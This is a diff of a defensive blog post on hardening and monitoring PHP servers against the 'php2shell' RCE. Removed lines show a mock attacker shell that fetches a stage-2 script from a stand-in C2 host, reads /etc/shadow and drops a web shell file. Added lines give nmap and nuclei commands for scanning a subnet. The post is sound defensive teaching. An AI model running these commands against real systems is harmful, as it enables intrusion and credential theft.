+      <line x1="179" y1="255" x2="165" y2="269" stroke="#f85149" stroke-width="2"/>
+
+      <!-- Arrow: EC2 → Firewall (right to left) -->
+      <line x1="656" y1="222" x2="484" y2="222" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
+
+      <!-- EC2 Web tier (inside, right) -->
+      <use href="#ico-ec2" x="660" y="200" width="44" height="44"/>
+      <text x="682" y="260" text-anchor="middle" fill="#c9d1d9" font-size="10">Web tier</text>
     </svg>
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid #30363d;border-top:none;border-radius:0 0 10px 10px;overflow:hidden;">
       <div style="padding:12px 16px;border-right:1px solid #30363d;background:#0d1117;">
@@ -389,199 +511,67 @@ pm.max_requests = 1</div>
 
   <div class="callout note">
     <div class="callout-title">egress filtering alone isn't enough</div>
-    An attacker already inside the web tier can still reach your secrets and whatever paths you did allow. Blocking outbound is one wall, not the building. That's the whole reason for least-privilege roles and tight segmentation sitting next to it.
+    An attacker already inside the web tier can still reach your secrets and whatever paths you did allow. Egress filtering alone does not protect you. That's the whole reason for least-privilege roles and tight segmentation sitting next to it.
   </div>
 
-  <h2 style="font-size:17px;margin-top:40px;">Layer 3: contain the host</h2>
+  <h2 style="font-size:17px;margin-top:40px;">Layer 3: hardening the host</h2>
 
-  <p>Assume something runs anyway and make it worthless. Enforce IMDSv2 with hop limit 1 and strip the instance role to the minimum, so a foothold doesn't turn into stolen AWS credentials. Run PHP as a non-root user, mount the webroot read-only, and set <code>noexec</code> on anything writable, so a web shell can't drop and run a binary. Small changes, ugly payoff for the attacker.</p>
+  <div class="callout warn">
+    <div class="callout-title">what is IMDSv2?</div>
+    IMDS stands for Instance Metadata Service. It is an endpoint that every EC2 instance can reach at 169.254.169.254 to ask AWS for information about itself, including its IAM credentials. IMDSv2 is the newer, more secure version: it requires a session token before returning anything, so a simple HTTP request from an attacker's shell is not enough to get the credentials. Setting hop limit 1 means the request can only come from the instance itself, not from a container or process one network hop away.
+  </div>
+
+  <p>Even if the exploit lands, you can limit how much damage it does. IMDSv2 with hop limit 1 blocks a shell from querying the EC2 metadata service to steal AWS credentials. A minimal instance role means even if it does get credentials, there is nothing useful attached to them. Run PHP as a non-root user, mount the webroot read-only, and set <code>noexec</code> on anything writable, so a web shell can't drop and execute a binary. The goal is to make the foothold as useless as possible.</p>
 
   <figure style="margin:24px 0;">
     <div class="diagram-title">Layer 3 · shell obtained, blast radius contained</div>
-    <svg viewBox="0 0 760 272" role="img" aria-label="Fake terminal showing a reverse shell that landed as www-data. Every escalation attempt fails: sudo is denied, DNS Firewall blocks C2 resolution, the instance role is minimal, system files are unreadable, and the webroot is mounted read-only." style="width:100%;height:auto;display:block;background:#0d1117;border:1px solid #30363d;border-radius:10px;font-family:'JetBrains Mono',monospace;">
-      <text x="380" y="22" text-anchor="middle" fill="#8b949e" font-size="10">attacker gets a shell · every next step is a dead end</text>
-      <line x1="28" y1="30" x2="732" y2="30" stroke="#30363d"/>
-
-      <!-- terminal window -->
-      <rect x="28" y="40" width="340" height="216" rx="8" fill="#0d1117" stroke="#30363d"/>
-      <rect x="28" y="40" width="340" height="24" rx="8" fill="#161b22"/>
-      <rect x="28" y="52" width="340" height="12" fill="#161b22"/>
-      <circle cx="42" cy="52" r="4" fill="#ff5f56"/>
-      <circle cx="56" cy="52" r="4" fill="#ffbd2e"/>
-      <circle cx="70" cy="52" r="4" fill="#27c93f"/>
-      <text x="198" y="57" text-anchor="middle" fill="#8b949e" font-size="9">bash – www-data</text>
-
-      <text x="40" y="79" fill="#3fb950" font-size="9.5">$ id</text>
-      <text x="40" y="91" fill="#c9d1d9" font-size="9">uid=33(www-data) gid=33(www-data)</text>
-
-      <text x="40" y="109" fill="#3fb950" font-size="9.5">$ sudo -l</text>
-      <text x="40" y="121" fill="#f85149" font-size="9">sudo: Permission denied</text>
-
-      <text x="40" y="139" fill="#3fb950" font-size="9.5">$ curl https://c2.badguy.net/s2.sh</text>
-      <text x="40" y="151" fill="#f85149" font-size="9">curl: (6) Could not resolve host</text>
-
-      <text x="40" y="169" fill="#3fb950" font-size="9.5">$ aws sts get-caller-identity</text>
-      <text x="40" y="181" fill="#f85149" font-size="9">An error occurred (AccessDenied)</text>
-
-      <text x="40" y="199" fill="#3fb950" font-size="9.5">$ cat /etc/shadow</text>
-      <text x="40" y="211" fill="#f85149" font-size="9">Permission denied</text>
-
-      <text x="40" y="229" fill="#3fb950" font-size="9.5">$ touch /var/www/html/sh.php</text>
-      <text x="40" y="241" fill="#f85149" font-size="9">touch: Read-only file system</text>
-
-      <!-- right column: what stopped it -->
-      <text x="388" y="57" fill="#8b949e" font-size="9">layer that stopped it</text>
-      <line x1="388" y1="63" x2="732" y2="63" stroke="#30363d"/>
-
-      <text x="388" y="84" fill="#3fb950" font-size="9">✓ shell landed as uid=33</text>
-      <text x="388" y="96" fill="#8b949e" font-size="8.5">  non-root from the start</text>
-
-      <text x="388" y="114" fill="#f85149" font-size="9">✗ L3: no sudo, no suid path</text>
-      <text x="388" y="126" fill="#8b949e" font-size="8.5">  non-root user · privesc absent</text>
-
-      <text x="388" y="144" fill="#f85149" font-size="9">✗ L2: DNS Firewall blocked domain</text>
-      <text x="388" y="156" fill="#8b949e" font-size="8.5">  egress allowlist · no stage-2 pull</text>
-
-      <text x="388" y="174" fill="#f85149" font-size="9">✗ L3: instance role has no permissions</text>
-      <text x="388" y="186" fill="#8b949e" font-size="8.5">  IMDSv2 only · minimal IAM policy</text>
-
-      <text x="388" y="204" fill="#f85149" font-size="9">✗ L3: www-data owns /var/www only</text>
-      <text x="388" y="216" fill="#8b949e" font-size="8.5">  no read on system files</text>
-
-      <text x="388" y="234" fill="#f85149" font-size="9">✗ L3: webroot mounted read-only</text>
-      <text x="388" y="246" fill="#8b949e" font-size="8.5">  noexec on writable dirs · no drop</text>
-
-      <line x1="28" y1="256" x2="732" y2="256" stroke="#30363d"/>
-      <text x="380" y="268" text-anchor="middle" fill="#8b949e" font-size="9">blast radius: one process · one box · nothing pivots, exfils, or persists</text>
-    </svg>
-    <figcaption style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#8b949e;text-align:center;margin-top:10px;">The shell runs. None of the follow-on steps do.</figcaption>
+    <img src="/assets/img/php2shell-layer3-shell.webp" alt="Penelope reverse shell handler showing a www-data shell on web01, alongside exploit output from the php2shell PoC including heap spray addresses and the delivered leak-to-RCE payload." style="width:100%;height:auto;display:block;border-radius:10px;border:1px solid #30363d;">
+    <figcaption style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#8b949e;text-align:center;margin-top:10px;">The shell runs as www-data. The exploit output shows the full heap-leak-to-RCE chain.</figcaption>
   </figure>
 
-  <h2 style="font-size:17px;margin-top:40px;">Layer 4: see it, then rank it</h2>
+  <h2 style="font-size:17px;margin-top:40px;">Layer 4: inventory</h2>
 
-  <p>You can't harden what you can't see, so inventory first. I'd use Wiz to find PHP versions across the estate and rank assets by internet exposure and attack paths, so the internet-facing 8.1 box gets your attention before the internal one. For detection, Falcon to alert on <code>php-fpm</code>, <code>httpd</code> or <code>apache2</code> spawning shells, <code>curl</code>, <code>wget</code> or interpreters, and to hunt for web shells with RTR. On AWS, GuardDuty Runtime Monitoring and Malware Protection, VPC Flow Logs, Inspector, and SSM to push config at scale.</p>
+  <p>You can't harden what you can't see, so inventory first. I'd use Wiz to find PHP versions across the estate and rank assets by internet exposure and attack paths, so the internet-facing 8.1 box gets your attention before the internal one. But any bash script can do basically the same.</p>
 
-  <figure style="margin:24px 0;">
-    <div class="diagram-title">Layer 4 · Wiz Security Graph · exposed PHP assets</div>
-    <svg viewBox="0 0 760 328" role="img" aria-label="Mock Wiz Security Graph query finding EC2 instances running PHP below version 8.5.12 that are exposed to the internet. Results show 4 assets: two internet-facing critical findings on PHP 8.5.11 and 8.4.26, one high finding on an internal instance running PHP 8.3.35, and one high finding on PHP 8.1.32 marked end of life." style="width:100%;height:auto;display:block;background:#080c18;border:1px solid #1e2d4a;border-radius:10px;font-family:'JetBrains Mono',monospace;">
+  <!-- TODO: replace with your Layer 4 Wiz Security Graph screenshot/image -->
 
-      <!-- header bar -->
-      <rect x="0" y="0" width="760" height="44" rx="10" fill="#0e1933"/>
-      <rect x="0" y="24" width="760" height="20" fill="#0e1933"/>
-      <polygon points="22,13 30,21 22,29 14,21" fill="#00d4b8"/>
-      <text x="38" y="27" fill="#e6edf3" font-size="12" font-weight="700">Wiz</text>
-      <text x="68" y="27" fill="#6e7d94" font-size="12"> · Security Graph</text>
-      <rect x="644" y="14" width="96" height="16" rx="3" fill="rgba(248,81,73,0.18)" stroke="#f85149" stroke-width="1"/>
-      <text x="692" y="26" text-anchor="middle" fill="#f85149" font-size="9" letter-spacing="0.8">4 CRITICAL</text>
+  <div class="terminal">
+    <button class="copy-btn" data-copy="# find live web hosts in the subnet&#10;nmap -p 80,443 --open -oG - 10.0.1.0/24 \&#10;  | awk '/open/{print $2}' > live_web.txt&#10;&#10;# check each host for vulnerable PHP&#10;nuclei -l live_web.txt -tags php -severity critical,high">copy</button>
+    <div class="terminal-bar">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="terminal-label">bash &mdash; find exposed PHP servers in a subnet</span>
+    </div>
+    <div class="terminal-body"><span class="prompt"># find live web hosts in the subnet</span>
+nmap -p 80,443 --open -oG - 10.0.1.0/24 \
+  | awk '/open/{print $2}' > live_web.txt
 
-      <!-- query bar -->
-      <rect x="16" y="52" width="728" height="22" rx="4" fill="#0e1933" stroke="#1e2d4a" stroke-width="1"/>
-      <text x="28" y="67" fill="#00d4b8" font-size="10">CloudResource(EC2)</text>
-      <text x="192" y="67" fill="#6e7d94" font-size="10"> -[RUNS]→ </text>
-      <text x="258" y="67" fill="#ffa657" font-size="10">Software(php &lt; 8.5.12)</text>
-      <text x="422" y="67" fill="#6e7d94" font-size="10"> -[EXPOSES]→ </text>
-      <text x="514" y="67" fill="#00d4b8" font-size="10">Internet</text>
-      <line x1="0" y1="80" x2="760" y2="80" stroke="#1e2d4a"/>
+<span class="prompt"># check each host for vulnerable PHP</span>
+nuclei -l live_web.txt -tags php -severity critical,high</div>
+  </div>
 
-      <!-- attack path: Internet node -->
-      <rect x="24" y="100" width="86" height="54" rx="8" fill="#0e1933" stroke="#2a3f5e" stroke-width="1.5"/>
-      <text x="67" y="124" text-anchor="middle" fill="#6e7d94" font-size="20">&#9702;</text>
-      <text x="67" y="143" text-anchor="middle" fill="#6e7d94" font-size="9">Internet</text>
+  <div class="callout note">
+    <div class="callout-title">how to install nuclei</div>
+    Nuclei is a fast, template-based vulnerability scanner by ProjectDiscovery. To install it, you need Go on your system. Then run:<br><br>
+    <code>go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</code><br><br>
+    On Kali Linux it is also available via apt:<br><br>
+    <code>sudo apt install -y nuclei</code><br><br>
+    Either way, pull the latest templates before you scan: <code>nuclei -update-templates</code>
+  </div>
 
-      <!-- arrow Internet → SG -->
-      <line x1="112" y1="127" x2="210" y2="127" stroke="#f85149" stroke-width="1.5" marker-end="url(#ahr)"/>
-      <text x="161" y="119" text-anchor="middle" fill="#f85149" font-size="8">0.0.0.0/0:443</text>
+  <div class="section-title">05 &mdash; logs &amp; detection</div>
+  <h2>Always check your logs</h2>
 
-      <!-- SG node -->
-      <rect x="214" y="100" width="106" height="54" rx="8" fill="#0e1933" stroke="#f85149" stroke-width="1.5"/>
-      <text x="267" y="121" text-anchor="middle" fill="#c9d1d9" font-size="9.5">Security Group</text>
-      <text x="267" y="134" text-anchor="middle" fill="#f85149" font-size="8.5">0.0.0.0/0 inbound</text>
-      <text x="267" y="146" text-anchor="middle" fill="#6e7d94" font-size="8">no IP restriction</text>
+  <p>Some of the biggest breaches in history were detected weeks or months after the initial compromise. Two that come to mind: the Target POS breach in 2013, where FireEye alerts fired and went unacknowledged for weeks before external researchers flagged the compromise, and the VTech breach in 2015, where millions of children's records were stolen before the company knew anything had happened. Checking your logs is never a bad idea.</p>
 
-      <!-- arrow SG → EC2 -->
-      <line x1="322" y1="127" x2="414" y2="127" stroke="#f85149" stroke-width="1.5" marker-end="url(#ahr)"/>
-      <text x="368" y="119" text-anchor="middle" fill="#6e7d94" font-size="8.5">EXPOSES</text>
+  <p>Vendors are treating PHP crashes and memory exhaustion errors as likely signs of exploitation. Both bugs are about memory going wrong, so seeing a run of those in your logs is not good news. On any exposed asset, check the Apache or nginx access and error logs. Inspect the firewall logs. Look for abnormal outbound traffic from any PHP host, especially to unfamiliar destinations. That is a strong indicator that an RCE was executed.</p>
 
-      <!-- EC2+PHP node -->
-      <rect x="418" y="88" width="148" height="78" rx="8" fill="#0e1933" stroke="#f85149" stroke-width="2"/>
-      <rect x="428" y="97" width="128" height="14" rx="3" fill="rgba(248,81,73,0.14)" stroke="rgba(248,81,73,0.3)" stroke-width="1"/>
-      <text x="492" y="108" text-anchor="middle" fill="#f85149" font-size="8" letter-spacing="1">CRITICAL</text>
-      <text x="492" y="126" text-anchor="middle" fill="#c9d1d9" font-size="10" font-weight="600">EC2 · PHP 8.5.11</text>
-      <text x="492" y="140" text-anchor="middle" fill="#6e7d94" font-size="8.5">Apache mod_php · unpatched</text>
-      <text x="492" y="153" text-anchor="middle" fill="#f85149" font-size="8">CVE-2026-109618 / 109619</text>
+  <p>Some administrators hash key directories for file integrity monitoring, particularly read-only ones. If a hash changes and you can correlate it with a web server or firewall log anomaly, you have a much clearer picture of a potential breach.</p>
 
-      <!-- x4 badge -->
-      <rect x="584" y="100" width="52" height="20" rx="4" fill="rgba(248,81,73,0.12)" stroke="rgba(248,81,73,0.3)" stroke-width="1"/>
-      <text x="610" y="114" text-anchor="middle" fill="#f85149" font-size="9.5">× 4</text>
-      <text x="610" y="130" text-anchor="middle" fill="#6e7d94" font-size="8">instances</text>
-
-      <!-- divider -->
-      <line x1="0" y1="188" x2="760" y2="188" stroke="#1e2d4a"/>
-
-      <!-- table header -->
-      <rect x="0" y="188" width="760" height="24" fill="#0c1628"/>
-      <text x="20" y="204" fill="#6e7d94" font-size="8.5" letter-spacing="0.8">ASSET</text>
-      <text x="210" y="204" fill="#6e7d94" font-size="8.5" letter-spacing="0.8">PHP VERSION</text>
-      <text x="340" y="204" fill="#6e7d94" font-size="8.5" letter-spacing="0.8">EXPOSURE</text>
-      <text x="506" y="204" fill="#6e7d94" font-size="8.5" letter-spacing="0.8">RISK</text>
-      <text x="604" y="204" fill="#6e7d94" font-size="8.5" letter-spacing="0.8">ACTION</text>
-      <line x1="0" y1="212" x2="760" y2="212" stroke="#1e2d4a"/>
-
-      <!-- row 1 -->
-      <text x="20" y="228" fill="#c9d1d9" font-size="9">web-prod-1a</text>
-      <text x="210" y="228" fill="#f85149" font-size="9">8.5.11</text>
-      <text x="340" y="228" fill="#f85149" font-size="9">Internet-facing</text>
-      <rect x="504" y="219" width="62" height="13" rx="3" fill="rgba(248,81,73,0.14)"/>
-      <text x="535" y="229" text-anchor="middle" fill="#f85149" font-size="8.5">CRITICAL</text>
-      <text x="604" y="228" fill="#6e7d94" font-size="9">patch now</text>
-      <line x1="20" y1="234" x2="740" y2="234" stroke="#1e2d4a"/>
-
-      <!-- row 2 -->
-      <text x="20" y="250" fill="#c9d1d9" font-size="9">web-prod-1b</text>
-      <text x="210" y="250" fill="#f85149" font-size="9">8.4.26</text>
-      <text x="340" y="250" fill="#f85149" font-size="9">Internet-facing</text>
-      <rect x="504" y="241" width="62" height="13" rx="3" fill="rgba(248,81,73,0.14)"/>
-      <text x="535" y="251" text-anchor="middle" fill="#f85149" font-size="8.5">CRITICAL</text>
-      <text x="604" y="250" fill="#6e7d94" font-size="9">patch now</text>
-      <line x1="20" y1="256" x2="740" y2="256" stroke="#1e2d4a"/>
-
-      <!-- row 3 -->
-      <text x="20" y="272" fill="#c9d1d9" font-size="9">web-staging-1</text>
-      <text x="210" y="272" fill="#ffa657" font-size="9">8.3.35</text>
-      <text x="340" y="272" fill="#ffa657" font-size="9">Internal + NAT</text>
-      <rect x="504" y="263" width="46" height="13" rx="3" fill="rgba(255,166,87,0.14)"/>
-      <text x="527" y="273" text-anchor="middle" fill="#ffa657" font-size="8.5">HIGH</text>
-      <text x="604" y="272" fill="#6e7d94" font-size="9">patch next</text>
-      <line x1="20" y1="278" x2="740" y2="278" stroke="#1e2d4a"/>
-
-      <!-- row 4 -->
-      <text x="20" y="294" fill="#c9d1d9" font-size="9">internal-svc-3</text>
-      <text x="210" y="294" fill="#ffa657" font-size="9">8.1.32 (EOL)</text>
-      <text x="340" y="294" fill="#6e7d94" font-size="9">VPC-only</text>
-      <rect x="504" y="285" width="46" height="13" rx="3" fill="rgba(255,166,87,0.14)"/>
-      <text x="527" y="295" text-anchor="middle" fill="#ffa657" font-size="8.5">HIGH</text>
-      <text x="604" y="294" fill="#ffa657" font-size="9">migrate off 8.1</text>
-
-      <!-- footer -->
-      <line x1="0" y1="304" x2="760" y2="304" stroke="#1e2d4a"/>
-      <rect x="0" y="304" width="760" height="24" fill="#0c1628"/>
-      <rect x="0" y="316" width="760" height="12" fill="#0c1628"/>
-      <text x="20" y="320" fill="#6e7d94" font-size="8.5">fix internet-facing instances first · sort by exposure, then by version</text>
-      <text x="690" y="320" text-anchor="middle" fill="#00d4b8" font-size="8.5">Wiz Explorer</text>
-    </svg>
-    <figcaption style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#8b949e;text-align:center;margin-top:10px;">Inventory first, rank by internet exposure. The internet-facing 8.1 box gets your attention before the internal one.</figcaption>
-  </figure>
-
-  <p>One detection note worth keeping: vendors are treating PHP crashes and memory exhaustion errors as likely signs of exploitation. Both bugs are about memory going wrong, so a sudden run of those in your logs is a lead, not noise.</p>
-
-  <div class="section-title">05 &mdash; assume exposure</div>
-  <h2>If it was exposed, go hunt</h2>
-
-  <p>The proof of concept leaked before the patches landed. That ordering matters. It means there was a window where exploit code existed and fixes didn't, so mitigation after the fact doesn't tell you that nothing happened during it. On any asset that was exposed, hunt for compromise, even one you've since mitigated or patched. Clean today does not mean clean last Tuesday.</p>
+  <p>If you use Falcon it can also assist with alerts on <code>php-fpm</code>, <code>httpd</code> or <code>apache2</code> spawning shells, <code>curl</code>, <code>wget</code> or interpreters, and with hunting for web shells via RTR. On AWS, GuardDuty, VPC Flow Logs, and Inspector are useful here as well.</p>
 
   <div class="callout warn">
     <div class="callout-title">before you rely on anything here</div>
-    I pulled the mitigation details from secondary sources that quote the PHP project, and that guidance can change. Check the PHP project's own advisory pages before you act on this, especially the <code>php.ini</code> values. On a pre-auth RCE you want the primary source, not a blog, including this one.
+    Check the PHP project's own advisory pages before you act on this, especially the <code>php.ini</code> values. This is a serious vulnerability. The vendor's technical advice should always be your primary source.
   </div>
 
   <div class="section-title">// sources</div>
@@ -594,6 +584,8 @@ pm.max_requests = 1</div>
     <li><a href="https://www.darkreading.com/application-security/php2shell-bugs-red-alert-security-industry" target="_blank" rel="noopener">Dark Reading</a></li>
     <li><a href="https://www.techzine.eu/blogs/security/145168/php-shuts-the-internet-why-php2shell-affects-every-company/" target="_blank" rel="noopener">Techzine</a></li>
     <li><a href="https://www.threatlocker.com/blog/php2shell-why-organizations-must-patch-critical-php-vulnerabilities-now" target="_blank" rel="noopener">ThreatLocker</a></li>
+    <li><a href="https://en.wikipedia.org/wiki/2013_Target_Corporation_data_breach" target="_blank" rel="noopener">Wikipedia, 2013 Target Corporation data breach</a></li>
+    <li><a href="https://en.wikipedia.org/wiki/VTech_data_breach" target="_blank" rel="noopener">Wikipedia, VTech data breach (2015)</a></li>
   </ul>
 
   <div class="giscus" style="margin-top: 72px;"></div>
